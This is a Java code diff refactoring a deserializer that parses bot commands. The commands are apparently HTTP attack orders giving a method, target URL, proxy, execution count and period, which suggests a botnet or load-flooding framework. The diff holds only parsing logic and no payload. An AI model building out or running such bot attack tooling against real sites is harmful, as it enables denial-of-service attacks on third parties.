@@ -101,7 +101,13 @@ public class BotCommandDeserializer extends StdDeserializer<BotCommand> {
           if (!node.hasNonNull("attacks")) {
             throw new IOException("Cannot read parameters [attacks] for scope [ATTACK_HTTP] (missing)");
           }
-          final List<HttpAttack> httpAttacks = deserializeHttpAttacks(node.get("attacks"));
+          List<HttpAttack> httpAttacks = new ArrayList<>();
+          Iterator<JsonNode> i = node.get("attacks").elements();
+          while (i.hasNext()) {
+            JsonNode n = i.next();
+            HttpAttack attack = ctx.readValue(n.traverse(parser.getCodec()), HttpAttack.class);
+            httpAttacks.add(attack);
+          }
 
           cmd.getParams().put("attacks", httpAttacks);
 
@@ -215,50 +221,5 @@ public class BotCommandDeserializer extends StdDeserializer<BotCommand> {
     }
 
     return cmd;
-  }
-
-  /**
-   * Deserializes a list of {@link HttpAttack} from a JSON node.
-   * @param node the JSON node to parse.
-   * @return the deserialized list of {@link HttpAttack}.
-   */
-  private static List<HttpAttack> deserializeHttpAttacks(JsonNode node) throws IOException {
-    List<HttpAttack> attacks = new ArrayList<>();
-    Iterator<JsonNode> iter = node.elements();
-    while (iter.hasNext()) {
-      JsonNode n = iter.next();
-      if (!n.hasNonNull("method") ||
-          !n.hasNonNull("target")) {
-        throw new IOException("Cannot deserialize attacks. Params [method, target] missing or null");
-      }
-      final HttpMethod method = HttpMethod.valueOf(n.get("method").asText());
-      final String target = n.get("target").asText();
-
-      HttpAttack attack = new HttpAttack(method, new URL(target));
-
-      if (n.hasNonNull("proxy")) {
-        final HttpProxy proxy = HttpProxy.valueOf(n.get("proxy").asText());
-        attack.setProxy(proxy);
-      }
-
-      if (n.hasNonNull("properties")) {
-        Map<String,String> properties =
-            new ObjectMapper().readValue(n.get("properties").traverse(), new TypeReference<Map<String,String>>(){});
-        attack.setProperties(properties);
-      }
-
-      if (n.hasNonNull("executions")) {
-        final int executions = n.get("executions").asInt();
-        attack.setExecutions(executions);
-      }
-
-      if (n.hasNonNull("period")) {
-        final Interval period = Interval.valueOf(n.get("period").asText());
-        attack.setPeriod(period);
-      }
-
-      attacks.add(attack);
-    }
-    return attacks;
   }
 }
